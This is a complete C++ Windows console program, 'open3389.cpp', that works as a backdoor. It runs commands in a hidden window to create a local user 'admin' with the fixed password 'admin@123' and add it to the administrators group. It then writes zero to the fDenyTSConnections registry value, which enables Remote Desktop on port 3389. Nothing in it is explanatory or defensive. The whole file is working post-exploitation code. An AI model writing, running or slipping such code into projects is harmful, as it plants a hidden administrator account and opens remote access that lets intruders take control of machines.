// open3389.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>



BOOL excute(LPSTR lpCommandLine)
{

    PROCESS_INFORMATION ProcessInfo;
    
    STARTUPINFO StartupInfo; //This is an [in] parameter

    // ***********************
    // pipe
    // ***********************
    HANDLE hStdInput, hStdOutput;
    SECURITY_ATTRIBUTES SecAttr;
    SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    SecAttr.bInheritHandle = TRUE; 
    SecAttr.lpSecurityDescriptor = NULL; 

    BOOL ret = CreatePipe(&hStdInput, &hStdOutput, &SecAttr, 0);

    
    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);
    StartupInfo.hStdOutput = hStdOutput;
    StartupInfo.hStdError = 0;
	StartupInfo.wShowWindow = SW_HIDE;                                  //hide
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;  // hide
 

	BOOL bret = CreateProcessA(0, lpCommandLine, 0, 0, NORMAL_PRIORITY_CLASS, 0, 0, 0, &StartupInfo, &ProcessInfo);
    if(bret)
    {
		   WaitForSingleObject(ProcessInfo.hProcess,INFINITE);
           CloseHandle(ProcessInfo.hThread);
           CloseHandle(ProcessInfo.hProcess);
    
    }
   return bret;
}


BOOL reg_set(HKEY hKey, LPSTR lpSubKey, LPSTR lpValueName)
{
	HKEY phkResult = NULL;
	DWORD dwValue = 0;
	RegCreateKeyEx(hKey, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	RegSetValueEx(hKey, lpValueName, 0, REG_DWORD,  (CONST BYTE*)&dwValue, sizeof(DWORD));
	RegCloseKey(hKey);

    return true;
}


int main()
{
	excute("net user admin admin@123 /add");
	excute("net localgroup administrators admin /add");
	reg_set(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections");

    return 0;
}
